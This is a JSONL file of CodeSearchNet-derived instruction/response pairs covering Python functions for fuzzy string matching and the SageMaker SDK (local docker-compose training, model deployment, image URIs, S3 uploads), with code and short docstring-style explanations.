{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nmake sure that both objects are either string or unicode instances force them to unicode", "response": "def make_type_consistent(s1, s2):\n    \"\"\"If both objects aren't either both string or unicode instances force them to unicode\"\"\"\n    if isinstance(s1, str) and isinstance(s2, str):\n        return s1, s2\n\n    elif isinstance(s1, unicode) and isinstance(s2, unicode):\n        return s1, s2\n\n    else:\n        return unicode(s1), unicode(s2)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef full_process(s, force_ascii=False):\n\n    if force_ascii:\n        s = asciidammit(s)\n    # Keep only Letters and Numbers (see Unicode docs).\n    string_out = StringProcessor.replace_non_letters_non_numbers_with_whitespace(s)\n    # Force into lowercase.\n    string_out = StringProcessor.to_lower_case(string_out)\n    # Remove leading and trailing whitespaces.\n    string_out = StringProcessor.strip(string_out)\n    return string_out", "response": "Process string by\n        and return it as a unicode string."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the ratio of the most similar substring as a number between 0 and 100.", "response": "def partial_ratio(s1, s2):\n    \"\"\"\"Return the ratio of the most similar substring\n    as a number between 0 and 100.\"\"\"\n    s1, s2 = utils.make_type_consistent(s1, s2)\n\n    if len(s1) <= len(s2):\n        shorter = s1\n        longer = s2\n    else:\n        shorter = s2\n        longer = s1\n\n    m = SequenceMatcher(None, shorter, longer)\n    blocks = m.get_matching_blocks()\n\n    # each block represents a sequence of matching characters in a string\n    # of the form (idx_1, idx_2, len)\n    # the best partial match will block align with at least one of those blocks\n    #   e.g. shorter = \"abcd\", longer = XXXbcdeEEE\n    #   block = (1,3,3)\n    #   best score === ratio(\"abcd\", \"Xbcd\")\n    scores = []\n    for block in blocks:\n        long_start = block[1] - block[0] if (block[1] - block[0]) > 0 else 0\n        long_end = long_start + len(shorter)\n        long_substr = longer[long_start:long_end]\n\n        m2 = SequenceMatcher(None, shorter, long_substr)\n        r = m2.ratio()\n        if r > .995:\n            return 100\n        else:\n            scores.append(r)\n\n    return utils.intr(100 * max(scores))"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _process_and_sort(s, force_ascii, full_process=True):\n    # pull tokens\n    ts = utils.full_process(s, force_ascii=force_ascii) if full_process else s\n    tokens = ts.split()\n\n    # sort tokens and join\n    sorted_string = u\" \".join(sorted(tokens))\n    return sorted_string.strip()", "response": "Return a cleaned string with token sorted."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn a measure of the sequences s similarity between 0 and 100 but sorting the token before comparing.", "response": "def token_sort_ratio(s1, s2, force_ascii=True, full_process=True):\n    \"\"\"Return a measure of the sequences' similarity between 0 and 100\n    but sorting the token before comparing.\n    \"\"\"\n    return _token_sort(s1, s2, partial=False, force_ascii=force_ascii, full_process=full_process)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef partial_token_sort_ratio(s1, s2, force_ascii=True, full_process=True):\n    return _token_sort(s1, s2, partial=True, force_ascii=force_ascii, full_process=full_process)", "response": "Return the ratio of the most similar substring as a number between 0 and 100 but sorting the most similar substring before comparing."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the set of alphanumeric tokens in the two strings.", "response": "def _token_set(s1, s2, partial=True, force_ascii=True, full_process=True):\n    \"\"\"Find all alphanumeric tokens in each string...\n        - treat them as a set\n        - construct two strings of the form:\n            <sorted_intersection><sorted_remainder>\n        - take ratios of those two strings\n        - controls for unordered partial matches\"\"\"\n\n    if not full_process and s1 == s2:\n        return 100\n\n    p1 = utils.full_process(s1, force_ascii=force_ascii) if full_process else s1\n    p2 = utils.full_process(s2, force_ascii=force_ascii) if full_process else s2\n\n    if not utils.validate_string(p1):\n        return 0\n    if not utils.validate_string(p2):\n        return 0\n\n    # pull tokens\n    tokens1 = set(p1.split())\n    tokens2 = set(p2.split())\n\n    intersection = tokens1.intersection(tokens2)\n    diff1to2 = tokens1.difference(tokens2)\n    diff2to1 = tokens2.difference(tokens1)\n\n    sorted_sect = \" \".join(sorted(intersection))\n    sorted_1to2 = \" \".join(sorted(diff1to2))\n    sorted_2to1 = \" \".join(sorted(diff2to1))\n\n    combined_1to2 = sorted_sect + \" \" + sorted_1to2\n    combined_2to1 = sorted_sect + \" \" + sorted_2to1\n\n    # strip\n    sorted_sect = sorted_sect.strip()\n    combined_1to2 = combined_1to2.strip()\n    combined_2to1 = combined_2to1.strip()\n\n    if partial:\n        ratio_func = partial_ratio\n    else:\n        ratio_func = ratio\n\n    pairwise = [\n        ratio_func(sorted_sect, combined_1to2),\n        ratio_func(sorted_sect, combined_2to1),\n        ratio_func(combined_1to2, combined_2to1)\n    ]\n    return max(pairwise)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef QRatio(s1, s2, force_ascii=True, full_process=True):\n\n    if full_process:\n        p1 = utils.full_process(s1, force_ascii=force_ascii)\n        p2 = utils.full_process(s2, force_ascii=force_ascii)\n    else:\n        p1 = s1\n        p2 = s2\n\n    if not utils.validate_string(p1):\n        return 0\n    if not utils.validate_string(p2):\n        return 0\n\n    return ratio(p1, p2)", "response": "Quick ratio comparison between two strings."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef UQRatio(s1, s2, full_process=True):\n    return QRatio(s1, s2, force_ascii=False, full_process=full_process)", "response": "Unicode quick ratio of two strings"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef WRatio(s1, s2, force_ascii=True, full_process=True):\n\n    if full_process:\n        p1 = utils.full_process(s1, force_ascii=force_ascii)\n        p2 = utils.full_process(s2, force_ascii=force_ascii)\n    else:\n        p1 = s1\n        p2 = s2\n\n    if not utils.validate_string(p1):\n        return 0\n    if not utils.validate_string(p2):\n        return 0\n\n    # should we look at partials?\n    try_partial = True\n    unbase_scale = .95\n    partial_scale = .90\n\n    base = ratio(p1, p2)\n    len_ratio = float(max(len(p1), len(p2))) / min(len(p1), len(p2))\n\n    # if strings are similar length, don't use partials\n    if len_ratio < 1.5:\n        try_partial = False\n\n    # if one string is much much shorter than the other\n    if len_ratio > 8:\n        partial_scale = .6\n\n    if try_partial:\n        partial = partial_ratio(p1, p2) * partial_scale\n        ptsor = partial_token_sort_ratio(p1, p2, full_process=False) \\\n            * unbase_scale * partial_scale\n        ptser = partial_token_set_ratio(p1, p2, full_process=False) \\\n            * unbase_scale * partial_scale\n\n        return utils.intr(max(base, partial, ptsor, ptser))\n    else:\n        tsor = token_sort_ratio(p1, p2, full_process=False) * unbase_scale\n        tser = token_set_ratio(p1, p2, full_process=False) * unbase_scale\n\n        return utils.intr(max(base, tsor, tser))", "response": "Returns a measure of the sequences s similarity between 0 and 100."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning a measure of the sequences s similarity between 0 and 100 using different algorithms.", "response": "def UWRatio(s1, s2, full_process=True):\n    \"\"\"Return a measure of the sequences' similarity between 0 and 100,\n    using different algorithms. Same as WRatio but preserving unicode.\n    \"\"\"\n    return WRatio(s1, s2, force_ascii=False, full_process=full_process)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nprints the result of a timeit statement.", "response": "def print_result_from_timeit(stmt='pass', setup='pass', number=1000000):\n    \"\"\"\n    Clean function to know how much time took the execution of one statement\n    \"\"\"\n    units = [\"s\", \"ms\", \"us\", \"ns\"]\n    duration = timeit(stmt, setup, number=int(number))\n    avg_duration = duration / float(number)\n    thousands = int(math.floor(math.log(avg_duration, 1000)))\n\n    print(\"Total time: %fs. Average run: %.3f%s.\" % (\n        duration, avg_duration * (1000 ** -thousands), units[-thousands]))"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ndeploys this Model to an Endpoint and optionally return a Predictor.", "response": "def deploy(self, initial_instance_count, instance_type, endpoint_name=None, tags=None):\n        \"\"\"Deploy this ``Model`` to an ``Endpoint`` and optionally return a ``Predictor``.\n\n        Create a SageMaker ``Model`` and ``EndpointConfig``, and deploy an ``Endpoint`` from this ``Model``.\n        If ``self.predictor_cls`` is not None, this method returns a the result of invoking\n        ``self.predictor_cls`` on the created endpoint name.\n\n        The name of the created model is accessible in the ``name`` field of this ``Model`` after deploy returns\n\n        The name of the created endpoint is accessible in the ``endpoint_name``\n        field of this ``Model`` after deploy returns.\n\n        Args:\n            instance_type (str): The EC2 instance type to deploy this Model to. For example, 'ml.p2.xlarge'.\n            initial_instance_count (int): The initial number of instances to run in the\n                ``Endpoint`` created from this ``Model``.\n            endpoint_name (str): The name of the endpoint to create (default: None).\n                If not specified, a unique endpoint name will be created.\n            tags(List[dict[str, str]]): The list of tags to attach to this specific endpoint.\n\n        Returns:\n            callable[string, sagemaker.session.Session] or None: Invocation of ``self.predictor_cls`` on\n                the created endpoint name, if ``self.predictor_cls`` is not None. Otherwise, return None.\n        \"\"\"\n        if not self.sagemaker_session:\n            self.sagemaker_session = Session()\n\n        containers = self.pipeline_container_def(instance_type)\n\n        self.name = self.name or name_from_image(containers[0]['Image'])\n        self.sagemaker_session.create_model(self.name, self.role, containers, vpc_config=self.vpc_config)\n\n        production_variant = sagemaker.production_variant(self.name, instance_type, initial_instance_count)\n        self.endpoint_name = endpoint_name or self.name\n        self.sagemaker_session.endpoint_from_production_variants(self.endpoint_name, [production_variant], tags)\n        if self.predictor_cls:\n            return self.predictor_cls(self.endpoint_name, self.sagemaker_session)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _create_sagemaker_pipeline_model(self, instance_type):\n        if not self.sagemaker_session:\n            self.sagemaker_session = Session()\n\n        containers = self.pipeline_container_def(instance_type)\n\n        self.name = self.name or name_from_image(containers[0]['Image'])\n        self.sagemaker_session.create_model(self.name, self.role, containers, vpc_config=self.vpc_config)", "response": "Create a SageMaker Model Entity\n           "}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef delete_model(self):\n\n        if self.name is None:\n            raise ValueError('The SageMaker model must be created before attempting to delete.')\n\n        self.sagemaker_session.delete_model(self.name)", "response": "Delete the SageMaker model backing this pipeline model."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nstream the output of a process to stdout", "response": "def _stream_output(process):\n    \"\"\"Stream the output of a process to stdout\n\n    This function takes an existing process that will be polled for output. Only stdout\n    will be polled and sent to sys.stdout.\n\n    Args:\n        process(subprocess.Popen): a process that has been started with\n            stdout=PIPE and stderr=STDOUT\n\n    Returns (int): process exit code\n    \"\"\"\n    exit_code = None\n\n    while exit_code is None:\n        stdout = process.stdout.readline().decode(\"utf-8\")\n        sys.stdout.write(stdout)\n        exit_code = process.poll()\n\n    if exit_code != 0:\n        raise RuntimeError(\"Process exited with code: %s\" % exit_code)\n\n    return exit_code"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef train(self, input_data_config, output_data_config, hyperparameters, job_name):\n        self.container_root = self._create_tmp_folder()\n        os.mkdir(os.path.join(self.container_root, 'output'))\n        # create output/data folder since sagemaker-containers 2.0 expects it\n        os.mkdir(os.path.join(self.container_root, 'output', 'data'))\n        # A shared directory for all the containers. It is only mounted if the training script is\n        # Local.\n        shared_dir = os.path.join(self.container_root, 'shared')\n        os.mkdir(shared_dir)\n\n        data_dir = self._create_tmp_folder()\n        volumes = self._prepare_training_volumes(data_dir, input_data_config, output_data_config,\n                                                 hyperparameters)\n        # If local, source directory needs to be updated to mounted /opt/ml/code path\n        hyperparameters = self._update_local_src_path(hyperparameters, key=sagemaker.estimator.DIR_PARAM_NAME)\n\n        # Create the configuration files for each container that we will create\n        # Each container will map the additional local volumes (if any).\n        for host in self.hosts:\n            _create_config_file_directories(self.container_root, host)\n            self.write_config_files(host, hyperparameters, input_data_config)\n            shutil.copytree(data_dir, os.path.join(self.container_root, host, 'input', 'data'))\n\n        training_env_vars = {\n            REGION_ENV_NAME: self.sagemaker_session.boto_region_name,\n            TRAINING_JOB_NAME_ENV_NAME: job_name,\n        }\n        compose_data = self._generate_compose_file('train', additional_volumes=volumes,\n                                                   additional_env_vars=training_env_vars)\n        compose_command = self._compose()\n\n        if _ecr_login_if_needed(self.sagemaker_session.boto_session, self.image):\n            _pull_image(self.image)\n\n        process = subprocess.Popen(compose_command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n\n        try:\n            _stream_output(process)\n        except RuntimeError as e:\n            # _stream_output() doesn't have the command line. We will handle the exception\n            # which contains the exit code and append the command line to it.\n            msg = \"Failed to run: %s, %s\" % (compose_command, str(e))\n            raise RuntimeError(msg)\n        finally:\n            artifacts = self.retrieve_artifacts(compose_data, output_data_config, job_name)\n\n            # free up the training data directory as it may contain\n            # lots of data downloaded from S3. This doesn't delete any local\n            # data that was just mounted to the container.\n            dirs_to_delete = [data_dir, shared_dir]\n            self._cleanup(dirs_to_delete)\n\n        # Print our Job Complete line to have a similar experience to training on SageMaker where you\n        # see this line at the end.\n        print('===== Job Complete =====')\n        return artifacts", "response": "Run a training job locally using Docker - Compose."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef serve(self, model_dir, environment):\n        logger.info(\"serving\")\n\n        self.container_root = self._create_tmp_folder()\n        logger.info('creating hosting dir in {}'.format(self.container_root))\n\n        volumes = self._prepare_serving_volumes(model_dir)\n\n        # If the user script was passed as a file:// mount it to the container.\n        if sagemaker.estimator.DIR_PARAM_NAME.upper() in environment:\n            script_dir = environment[sagemaker.estimator.DIR_PARAM_NAME.upper()]\n            parsed_uri = urlparse(script_dir)\n            if parsed_uri.scheme == 'file':\n                volumes.append(_Volume(parsed_uri.path, '/opt/ml/code'))\n                # Update path to mount location\n                environment = environment.copy()\n                environment[sagemaker.estimator.DIR_PARAM_NAME.upper()] = '/opt/ml/code'\n\n        if _ecr_login_if_needed(self.sagemaker_session.boto_session, self.image):\n            _pull_image(self.image)\n\n        self._generate_compose_file('serve',\n                                    additional_env_vars=environment,\n                                    additional_volumes=volumes)\n        compose_command = self._compose()\n        self.container = _HostingContainer(compose_command)\n        self.container.start()", "response": "Start a local container using docker - compose."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nstops the serving container.", "response": "def stop_serving(self):\n        \"\"\"Stop the serving container.\n\n        The serving container runs in async mode to allow the SDK to do other tasks.\n        \"\"\"\n        if self.container:\n            self.container.down()\n            self.container.join()\n            self._cleanup()\n        # for serving we can delete everything in the container root.\n        _delete_tree(self.container_root)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngets the model artifacts from all the containers and store them in the artifacts directory.", "response": "def retrieve_artifacts(self, compose_data, output_data_config, job_name):\n        \"\"\"Get the model artifacts from all the container nodes.\n\n        Used after training completes to gather the data from all the individual containers. As the\n        official SageMaker Training Service, it will override duplicate files if multiple containers have\n        the same file names.\n\n        Args:\n            compose_data(dict): Docker-Compose configuration in dictionary format.\n\n        Returns: Local path to the collected model artifacts.\n\n        \"\"\"\n        # We need a directory to store the artfiacts from all the nodes\n        # and another one to contained the compressed final artifacts\n        artifacts = os.path.join(self.container_root, 'artifacts')\n        compressed_artifacts = os.path.join(self.container_root, 'compressed_artifacts')\n        os.mkdir(artifacts)\n\n        model_artifacts = os.path.join(artifacts, 'model')\n        output_artifacts = os.path.join(artifacts, 'output')\n\n        artifact_dirs = [model_artifacts, output_artifacts, compressed_artifacts]\n        for d in artifact_dirs:\n            os.mkdir(d)\n\n        # Gather the artifacts from all nodes into artifacts/model and artifacts/output\n        for host in self.hosts:\n            volumes = compose_data['services'][str(host)]['volumes']\n            for volume in volumes:\n                host_dir, container_dir = volume.split(':')\n                if container_dir == '/opt/ml/model':\n                    sagemaker.local.utils.recursive_copy(host_dir, model_artifacts)\n                elif container_dir == '/opt/ml/output':\n                    sagemaker.local.utils.recursive_copy(host_dir, output_artifacts)\n\n        # Tar Artifacts -> model.tar.gz and output.tar.gz\n        model_files = [os.path.join(model_artifacts, name) for name in os.listdir(model_artifacts)]\n        output_files = [os.path.join(output_artifacts, name) for name in os.listdir(output_artifacts)]\n        sagemaker.utils.create_tar_file(model_files, os.path.join(compressed_artifacts, 'model.tar.gz'))\n        sagemaker.utils.create_tar_file(output_files, os.path.join(compressed_artifacts, 'output.tar.gz'))\n\n        if output_data_config['S3OutputPath'] == '':\n            output_data = 'file://%s' % compressed_artifacts\n        else:\n            # Now we just need to move the compressed artifacts to wherever they are required\n            output_data = sagemaker.local.utils.move_to_destination(\n                compressed_artifacts,\n                output_data_config['S3OutputPath'],\n                job_name,\n                self.sagemaker_session)\n\n        _delete_tree(model_artifacts)\n        _delete_tree(output_artifacts)\n\n        return os.path.join(output_data, 'model.tar.gz')"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef write_config_files(self, host, hyperparameters, input_data_config):\n        config_path = os.path.join(self.container_root, host, 'input', 'config')\n\n        resource_config = {\n            'current_host': host,\n            'hosts': self.hosts\n        }\n\n        json_input_data_config = {}\n        for c in input_data_config:\n            channel_name = c['ChannelName']\n            json_input_data_config[channel_name] = {\n                'TrainingInputMode': 'File'\n            }\n            if 'ContentType' in c:\n                json_input_data_config[channel_name]['ContentType'] = c['ContentType']\n\n        _write_json_file(os.path.join(config_path, 'hyperparameters.json'), hyperparameters)\n        _write_json_file(os.path.join(config_path, 'resourceconfig.json'), resource_config)\n        _write_json_file(os.path.join(config_path, 'inputdataconfig.json'), json_input_data_config)", "response": "This method writes the hyperparameters resources and input data configuration files for the training containers."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nwrites a config file describing a training/hosting environment. This method generates a docker compose configuration file, it has an entry for each container that will be created (based on self.hosts). it calls :meth:~sagemaker.local_session.SageMakerContainer._create_docker_host to generate the config for each individual container. Args: command (str): either 'train' or 'serve' additional_volumes (list): a list of volumes that will be mapped to the containers additional_env_vars (dict): a dictionary with additional environment variables to be passed on to the containers. Returns: (dict) A dictionary representation of the configuration that was written.", "response": "def _generate_compose_file(self, command, additional_volumes=None, additional_env_vars=None):\n        \"\"\"Writes a config file describing a training/hosting  environment.\n\n        This method generates a docker compose configuration file, it has an entry for each container\n        that will be created (based on self.hosts). it calls\n        :meth:~sagemaker.local_session.SageMakerContainer._create_docker_host to generate the config\n        for each individual container.\n\n        Args:\n            command (str): either 'train' or 'serve'\n            additional_volumes (list): a list of volumes that will be mapped to the containers\n            additional_env_vars (dict): a dictionary with additional environment variables to be\n                passed on to the containers.\n\n        Returns: (dict) A dictionary representation of the configuration that was written.\n\n        \"\"\"\n        boto_session = self.sagemaker_session.boto_session\n        additional_volumes = additional_volumes or []\n        additional_env_vars = additional_env_vars or {}\n        environment = []\n        optml_dirs = set()\n\n        aws_creds = _aws_credentials(boto_session)\n        if aws_creds is not None:\n            environment.extend(aws_creds)\n\n        additional_env_var_list = ['{}={}'.format(k, v) for k, v in additional_env_vars.items()]\n        environment.extend(additional_env_var_list)\n\n        if os.environ.get(DOCKER_COMPOSE_HTTP_TIMEOUT_ENV) is None:\n            os.environ[DOCKER_COMPOSE_HTTP_TIMEOUT_ENV] = DOCKER_COMPOSE_HTTP_TIMEOUT\n\n        if command == 'train':\n            optml_dirs = {'output', 'output/data', 'input'}\n\n        services = {\n            h: self._create_docker_host(h, environment, optml_dirs,\n                                        command, additional_volumes) for h in self.hosts\n        }\n\n        content = {\n            # Use version 2.3 as a minimum so that we can specify the runtime\n            'version': '2.3',\n            'services': services,\n            'networks': {\n                'sagemaker-local': {'name': 'sagemaker-local'}\n            }\n        }\n\n        docker_compose_path = os.path.join(self.container_root, DOCKER_COMPOSE_FILENAME)\n        yaml_content = yaml.dump(content, default_flow_style=False)\n        logger.info('docker compose file: \\n{}'.format(yaml_content))\n        with open(docker_compose_path, 'w') as f:\n            f.write(yaml_content)\n\n        return content"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nbuild a list of volumes that need to be training for the container.", "response": "def _build_optml_volumes(self, host, subdirs):\n        \"\"\"Generate a list of :class:`~sagemaker.local_session.Volume` required for the container to start.\n\n        It takes a folder with the necessary files for training and creates a list of opt volumes that\n        the Container needs to start.\n\n        Args:\n            host (str): container for which the volumes will be generated.\n            subdirs (list): list of subdirectories that will be mapped. For example: ['input', 'output', 'model']\n\n        Returns: (list) List of :class:`~sagemaker.local_session.Volume`\n        \"\"\"\n        volumes = []\n\n        for subdir in subdirs:\n            host_dir = os.path.join(self.container_root, host, subdir)\n            container_dir = '/opt/ml/{}'.format(subdir)\n            volume = _Volume(host_dir, container_dir)\n            volumes.append(volume)\n\n        return volumes"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef model_fn(model_dir):\n    symbol = mx.sym.load('%s/model.json' % model_dir)\n    outputs = mx.symbol.softmax(data=symbol, name='softmax_label')\n    inputs = mx.sym.var('data')\n    param_dict = gluon.ParameterDict('model_')\n    net = gluon.SymbolBlock(outputs, inputs, param_dict)\n    net.load_params('%s/model.params' % model_dir, ctx=mx.cpu())\n    return net", "response": "Loads the gluon model. Called once when hosting service starts."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef transform_fn(net, data, input_content_type, output_content_type):\n    # we can use content types to vary input/output handling, but\n    # here we just assume json for both\n    parsed = json.loads(data)\n    nda = mx.nd.array(parsed)\n    output = net(nda)\n    prediction = mx.nd.argmax(output, axis=1)\n    response_body = json.dumps(prediction.asnumpy().tolist())\n    return response_body, output_content_type", "response": "Transform a request using the Gluon model. Called once per request."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _prepare_for_training(self, records, mini_batch_size=None, job_name=None):\n        num_records = None\n        if isinstance(records, list):\n            for record in records:\n                if record.channel == 'train':\n                    num_records = record.num_records\n                    break\n            if num_records is None:\n                raise ValueError('Must provide train channel.')\n        else:\n            num_records = records.num_records\n\n        # mini_batch_size is a required parameter\n        default_mini_batch_size = min(self.DEFAULT_MINI_BATCH_SIZE,\n                                      max(1, int(num_records / self.train_instance_count)))\n        use_mini_batch_size = mini_batch_size or default_mini_batch_size\n\n        super(PCA, self)._prepare_for_training(records=records, mini_batch_size=use_mini_batch_size, job_name=job_name)", "response": "Set hyperparameters needed for training."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef create_image_uri(region, framework, instance_type, framework_version, py_version=None,\n                     account='520713654638', accelerator_type=None, optimized_families=None):\n    \"\"\"Return the ECR URI of an image.\n\n    Args:\n        region (str): AWS region where the image is uploaded.\n        framework (str): framework used by the image.\n        instance_type (str): SageMaker instance type. Used to determine device type (cpu/gpu/family-specific optimized).\n        framework_version (str): The version of the framework.\n        py_version (str): Optional. Python version. If specified, should be one of 'py2' or 'py3'.\n            If not specified, image uri will not include a python component.\n        account (str): AWS account that contains the image. (default: '520713654638')\n        accelerator_type (str): SageMaker Elastic Inference accelerator type.\n        optimized_families (str): Instance families for which there exist specific optimized images.\n\n    Returns:\n        str: The appropriate image URI based on the given parameters.\n    \"\"\"\n    optimized_families = optimized_families or []\n\n    if py_version and py_version not in VALID_PY_VERSIONS:\n        raise ValueError('invalid py_version argument: {}'.format(py_version))\n\n    # Handle Account Number for Gov Cloud\n    account = VALID_ACCOUNTS_BY_REGION.get(region, account)\n\n    # Handle Local Mode\n    if instance_type.startswith('local'):\n        device_type = 'cpu' if instance_type == 'local' else 'gpu'\n    elif not instance_type.startswith('ml.'):\n        raise ValueError('{} is not a valid SageMaker instance type. See: '\n                         'https://aws.amazon.com/sagemaker/pricing/instance-types/'.format(instance_type))\n    else:\n        family = instance_type.split('.')[1]\n\n        # For some frameworks, we have optimized images for specific families, e.g c5 or p3. In those cases,\n        # we use the family name in the image tag. In other cases, we use 'cpu' or 'gpu'.\n        if family in optimized_families:\n            device_type = family\n        elif family[0] in ['g', 'p']:\n            device_type = 'gpu'\n        else:\n            device_type = 'cpu'\n\n    if py_version:\n        tag = \"{}-{}-{}\".format(framework_version, device_type, py_version)\n    else:\n        tag = \"{}-{}\".format(framework_version, device_type)\n\n    if _accelerator_type_valid_for_framework(framework=framework, accelerator_type=accelerator_type,\n                                             optimized_families=optimized_families):\n        framework += '-eia'\n\n    return \"{}/sagemaker-{}:{}\" \\\n        .format(get_ecr_image_uri_prefix(account, region), framework, tag)", "response": "Create an image URI based on the given parameters."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef validate_source_dir(script, directory):\n    if directory:\n        if not os.path.isfile(os.path.join(directory, script)):\n            raise ValueError('No file named \"{}\" was found in directory \"{}\".'.format(script, directory))\n\n    return True", "response": "Validate that the source directory exists and contains the user script."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef tar_and_upload_dir(session, bucket, s3_key_prefix, script,\n                       directory=None, dependencies=None, kms_key=None):\n    \"\"\"Package source files and upload a compress tar file to S3. The S3 location will be\n    ``s3://<bucket>/s3_key_prefix/sourcedir.tar.gz``.\n\n    If directory is an S3 URI, an UploadedCode object will be returned, but nothing will be\n    uploaded to S3 (this allow reuse of code already in S3).\n\n    If directory is None, the script will be added to the archive at ``./<basename of script>``.\n\n    If directory is not None, the (recursive) contents of the directory will be added to\n    the archive. directory is treated as the base path of the archive, and the script name is\n    assumed to be a filename or relative path inside the directory.\n\n    Args:\n        session (boto3.Session): Boto session used to access S3.\n        bucket (str): S3 bucket to which the compressed file is uploaded.\n        s3_key_prefix (str): Prefix for the S3 key.\n        script (str): Script filename or path.\n        directory (str): Optional. Directory containing the source file. If it starts with \"s3://\",\n            no action is taken.\n        dependencies (List[str]): Optional. A list of paths to directories (absolute or relative)\n                                containing additional libraries that will be copied into\n                                /opt/ml/lib\n        kms_key (str):  Optional. KMS key ID used to upload objects to the bucket (default: None).\n\n    Returns:\n        sagemaker.fw_utils.UserCode: An object with the S3 bucket and key (S3 prefix) and\n            script name.\n    \"\"\"\n    if directory and directory.lower().startswith('s3://'):\n        return UploadedCode(s3_prefix=directory, script_name=os.path.basename(script))\n\n    script_name = script if directory else os.path.basename(script)\n    dependencies = dependencies or []\n    key = '%s/sourcedir.tar.gz' % s3_key_prefix\n    tmp = tempfile.mkdtemp()\n\n    try:\n        source_files = _list_files_to_compress(script, directory) + dependencies\n        tar_file = sagemaker.utils.create_tar_file(source_files,\n                                                   os.path.join(tmp, _TAR_SOURCE_FILENAME))\n\n        if kms_key:\n            extra_args = {'ServerSideEncryption': 'aws:kms', 'SSEKMSKeyId': kms_key}\n        else:\n            extra_args = None\n\n        session.resource('s3').Object(bucket, key).upload_file(tar_file, ExtraArgs=extra_args)\n    finally:\n        shutil.rmtree(tmp)\n\n    return UploadedCode(s3_prefix='s3://%s/%s' % (bucket, key), script_name=script_name)", "response": "Package source files and upload a tar file to S3."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef framework_name_from_image(image_name):\n    sagemaker_pattern = re.compile(ECR_URI_PATTERN)\n    sagemaker_match = sagemaker_pattern.match(image_name)\n    if sagemaker_match is None:\n        return None, None, None, None\n    else:\n        # extract framework, python version and image tag\n        # We must support both the legacy and current image name format.\n        name_pattern = re.compile(\n            r'^sagemaker(?:-rl)?-(tensorflow|mxnet|chainer|pytorch|scikit-learn)(?:-)?(scriptmode)?:(.*)-(.*?)-(py2|py3)$') # noqa\n        legacy_name_pattern = re.compile(\n            r'^sagemaker-(tensorflow|mxnet)-(py2|py3)-(cpu|gpu):(.*)$')\n\n        name_match = name_pattern.match(sagemaker_match.group(9))\n        legacy_match = legacy_name_pattern.match(sagemaker_match.group(9))\n\n        if name_match is not None:\n            fw, scriptmode, ver, device, py = name_match.group(1), name_match.group(2), name_match.group(3),\\\n                name_match.group(4), name_match.group(5)\n            return fw, py, '{}-{}-{}'.format(ver, device, py), scriptmode\n        elif legacy_match is not None:\n            return legacy_match.group(1), legacy_match.group(2), legacy_match.group(4), None\n        else:\n            return None, None, None, None", "response": "Extract the framework and Python version from the image name."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nextracting the framework version from the image tag.", "response": "def framework_version_from_tag(image_tag):\n    \"\"\"Extract the framework version from the image tag.\n\n    Args:\n        image_tag (str): Image tag, which should take the form '<framework_version>-<device>-<py_version>'\n\n    Returns:\n        str: The framework version.\n    \"\"\"\n    tag_pattern = re.compile('^(.*)-(cpu|gpu)-(py2|py3)$')\n    tag_match = tag_pattern.match(image_tag)\n    return None if tag_match is None else tag_match.group(1)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nparse an s3 url and return a tuple containing the bucket name and prefix", "response": "def parse_s3_url(url):\n    \"\"\"Returns an (s3 bucket, key name/prefix) tuple from a url with an s3 scheme\n\n    Args:\n        url (str):\n\n    Returns:\n        tuple: A tuple containing:\n            str: S3 bucket name\n            str: S3 key\n    \"\"\"\n    parsed_url = urlparse(url)\n    if parsed_url.scheme != \"s3\":\n        raise ValueError(\"Expecting 's3' scheme, got: {} in {}\".format(parsed_url.scheme, url))\n    return parsed_url.netloc, parsed_url.path.lstrip('/')"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef model_code_key_prefix(code_location_key_prefix, model_name, image):\n    training_job_name = sagemaker.utils.name_from_image(image)\n    return '/'.join(filter(None, [code_location_key_prefix, model_name or training_job_name]))", "response": "Returns the s3 key prefix for uploading code during model deployment"}
